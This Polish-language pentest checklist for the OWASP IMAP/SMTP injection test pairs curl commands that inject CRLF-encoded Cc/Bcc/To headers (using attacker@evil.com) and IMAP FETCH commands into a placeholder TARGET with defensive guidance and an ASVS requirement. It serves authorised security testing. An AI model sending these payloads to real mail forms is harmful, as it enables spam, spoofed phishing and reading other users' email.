# WSTG-INPV-10 — Testing for IMAP SMTP Injection

## Cele

- Identify IMAP/SMTP injection points
- Understand the data flow and deployment structure of the system
- Assess the injection impacts

## KOMENDY

### SMTP Injection w formularzach kontaktowych

```bash
curl -X POST "https://TARGET/contact" -d "email=test@test.com%0ACc:attacker@evil.com&subject=test&body=test"
curl -X POST "https://TARGET/contact" -d "email=test@test.com%0ABcc:attacker@evil.com&subject=test&body=test"
curl -X POST "https://TARGET/contact" -d "email=test@test.com&subject=test%0AContent-Type: text/html%0A%0A<h1>injected</h1>&body=test"

```

### IMAP Injection

```bash
curl -s "https://TARGET/mail?mailbox=INBOX%0d%0aFETCH 1:* (BODY[HEADER])"

```

### Header injection

```bash
curl -X POST "https://TARGET/contact" -d "from=attacker%0ATo:victim@target.com&message=test"

```

## KOMENDY Z WORDLISTAMI

### fuzzdb SMTP injection (jesli istnieje)

```bash
# Referencja: Desktop/WSTG/fuzzdb-master/attack/email/

```

### Brak dedykowanych wordlist - test logiczny/manualny

```bash

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj formularze wysylajace emaile (kontakt, rejestracja, reset hasla)
2. Testuj wstrzykiwanie naglowkow SMTP (%0A, %0D%0A, \r\n)
3. Sprawdz czy mozna dodac Cc/Bcc/To do wiadomosci
4. Testuj IMAP komendy jesli aplikacja laczy sie z serwerem IMAP
5. Sprawdz czy email jest renderowany jako HTML (XSS via email)


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md

### SMTP Header Injection

- Atakujacy wstrzykuje naglowki SMTP przez CRLF (`%0D%0A`, `\r\n`)
- Payload: `attacker@evil.com%0ABcc: victim@target.com` — dodaje Bcc z adresem ofiary
- Skutki: mass mailing (spam), phishing z adresu zaufanego, wyciek informacji

### IMAP/SMTP Injection

- Jesli aplikacja laczy sie z serwerem poczty — atakujacy moze wstrzyknac komendy IMAP/SMTP
- IMAP: odczyt/usuniecie emaili innych uzytkownikow
- SMTP: wysylanie emaili jako dowolny nadawca (spoofing)

### Obrona

- **Odrzucaj CRLF** (`\r`, `\n`, `%0A`, `%0D`) w WSZYSTKICH polach email — header injection
- **Uzywaj bibliotek z wbudowana ochrona**: PHPMailer (>= 5.2.27), JavaMail, Python smtplib
- **NIE pozwalaj uzytkownikowi kontrolowac**: From, To, Cc, Bcc, Subject (chyba ze walidowane)
- **Allowlist znakow** w polach email: `[a-zA-Z0-9@._+-]`
- **Waliduj format email**: regex lub dedykowana biblioteka (np. email-validator)
- **Rate limiting** na wysylanie emaili — zapobiegaj mass mailing

### Email Body Injection (XSS via Email)

- Jesli email jest renderowany jako HTML — mozliwy XSS
- Sanityzuj HTML w body emaila — uzywaj text/plain lub DOMPurify na HTML
- Nie renderuj user-supplied content w HTML emailach bez sanityzacji

### Testowanie

- Wstrzyknij `%0ABcc:attacker@evil.com` w pola: nazwa, email, subject, message
- Sprawdz czy serwer wysyla email z dodanym Bcc
- Testuj rozne encodowania CRLF: `%0A`, `%0D%0A`, `\r\n`, `\n`

## ROZSZERZENIA BURP SUITE

Brak dedykowanych rozszerzen Burp dla tego testu.

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.3.11 | Sanitization | Verify that the application sanitizes user input before passing to mail systems to protect against SMTP or IMAP injection. |
